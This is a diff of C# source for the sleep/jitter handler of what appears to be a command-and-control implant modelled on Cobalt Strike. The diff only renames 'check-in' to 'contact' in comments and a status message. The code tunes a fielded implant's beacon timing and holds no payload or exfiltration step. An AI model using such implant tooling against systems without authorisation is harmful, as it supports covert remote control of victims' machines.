@@ -2,9 +2,9 @@ using Rod.V1;
 
 namespace Rod.Implant.Internal;
 
-// The beacon.sleep handler: retunes the live check-in cadence on a fielded
+// The beacon.sleep handler: retunes the live contact cadence on a fielded
 // implant (Cobalt Strike's sleep). Runs as an ordinary one-shot task, so the
-// change rides whatever check-in carried the tasking and applies from the
+// change rides whatever contact carried the tasking and applies from the
 // next sleep onward. Lives in its own always-trimmable handler source like
 // every other verb; the Cadence it writes is shared infrastructure and never
 // leaves the compilation whole.
@@ -14,7 +14,7 @@ namespace Rod.Implant.Internal;
 /// <c>"&lt;sleep&gt; [&lt;jitter&gt;]"</c> -- Go durations (<c>30s</c>,
 /// <c>5m</c>, <c>1m30s</c>) or bare seconds (<c>30</c>, <c>0</c>). A missing
 /// jitter keeps the current one; <c>0 0</c> is the interactive-as-poll
-/// posture (back-to-back check-ins, tasking picked up the moment it queues).
+/// posture (back-to-back contacts, tasking picked up the moment it queues).
 /// </summary>
 internal static class BeaconSleep
 {
@@ -35,9 +35,9 @@ internal static class BeaconSleep
 
         var prior = cadence.Set(sleep, jitter);
         return (TaskOutcome.Succeeded,
-            $"check-in every {Format(sleep)} ± {Format(jitter)} (was {Format(prior.Sleep)} ± {Format(prior.Jitter)});"
+            $"contact every {Format(sleep)} ± {Format(jitter)} (was {Format(prior.Sleep)} ± {Format(prior.Jitter)});"
             + " applies from the next cycle"
-            + (sleep == TimeSpan.Zero ? " -- back-to-back check-ins, the near-interactive posture" : ""));
+            + (sleep == TimeSpan.Zero ? " -- back-to-back contacts, the near-interactive posture" : ""));
     }
 
     // One duration token: a Go duration the baked profile already speaks
